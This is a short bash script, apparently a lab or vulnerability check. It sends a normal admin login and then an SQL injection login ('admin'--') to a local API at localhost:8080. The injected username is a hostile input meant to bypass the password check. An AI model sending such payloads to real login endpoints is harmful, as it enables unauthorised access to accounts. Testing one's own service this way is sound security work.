#!/bin/bash

json="{\"username\":\"admin\", \"password\":\"password123\"}"

echo "Trying to log into account 'admin'"
echo ""
echo "Sending $json"
echo "Received response:"
curl localhost:8080/api/login \
	-H "Content-Type: application/json" \
	-d "$json"
echo ""

json="{\"username\":\"admin'--\", \"password\":\"password123\"}"
echo "Trying SQL injection:"
echo "Sending $json"
echo "Received response:"
curl localhost:8080/api/login \
	-H "Content-Type: application/json" \
	-d "$json"
echo ""
